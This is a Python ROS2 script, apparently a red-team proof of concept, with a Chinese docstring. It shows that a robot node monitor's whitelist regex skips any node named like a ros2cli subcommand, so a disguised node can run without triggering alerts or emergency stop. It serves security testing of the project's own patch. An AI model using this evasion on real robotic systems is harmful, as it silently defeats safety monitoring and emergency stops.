#!/usr/bin/env python3
"""攻擊 N2 — _INTERNAL_NODE_REGEX 後門：偽裝成 ros2cli 子命令.

threat model 把這標為「G1 已修補」，但 G1 patch 只是把 prefix `_ros2cli_*`
精確化成正則，並沒有移除這個白名單。漏洞：

    monitor_node._INTERNAL_NODE_REGEX 接受:
        _ros2cli_[a-z]+_\\d+_[0-9a-fA-F]+

    攻擊者只要把 node 命名為「看起來像 ros2 CLI 子命令」的格式，
    就直接被 monitor 跳過（continue），完全不發 alert、不觸發 emergency stop。

例如：
    _ros2cli_topic_99999_deadbeef    ← 匹配
    _ros2cli_echo_1234_cafef00d      ← 匹配
    transform_listener_impl_<hex>    ← 也匹配（同一份正則）

驗證：12_紅隊攻擊測試.sh 用 `_attacker_disguised` → 不匹配 → 確實被抓
但攻擊者只要把名字改成正則接受的格式，G1 修補完全失效。
"""
import sys
import time
import rclpy
from rclpy.node import Node


# 攻擊名字可由 CLI 傳入，預設用一個明顯 evil 的
DEFAULT_NAME = '_ros2cli_evil_99999_deadbeefcafe'


class StealthyAttacker(Node):
    """偽裝成 ros2 CLI 子命令，monitor 完全不會發 alert"""

    def __init__(self, fake_name: str):
        super().__init__(fake_name)
        self._n = 0
        self.create_timer(1.0, self._tick)
        self.get_logger().error(
            f'🥷 偽裝為「{fake_name}」'
            f'（匹配 _INTERNAL_NODE_REGEX，monitor 永遠不會發 alert）'
        )

    def _tick(self):
        self._n += 1
        self.get_logger().warn(
            f'  我還在這（已存活 {self._n} 秒），但 monitor 看不到我'
        )


def main():
    fake_name = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_NAME
    duration = float(sys.argv[2]) if len(sys.argv) > 2 else 15.0
    rclpy.init()
    node = StealthyAttacker(fake_name)
    deadline = time.monotonic() + duration
    try:
        while rclpy.ok() and time.monotonic() < deadline:
            rclpy.spin_once(node, timeout_sec=0.5)
    finally:
        node.get_logger().error('⏹ 結束（隱身退場，monitor 從未發過 alert）')
        node.destroy_node()
        rclpy.shutdown()


if __name__ == '__main__':
    main()
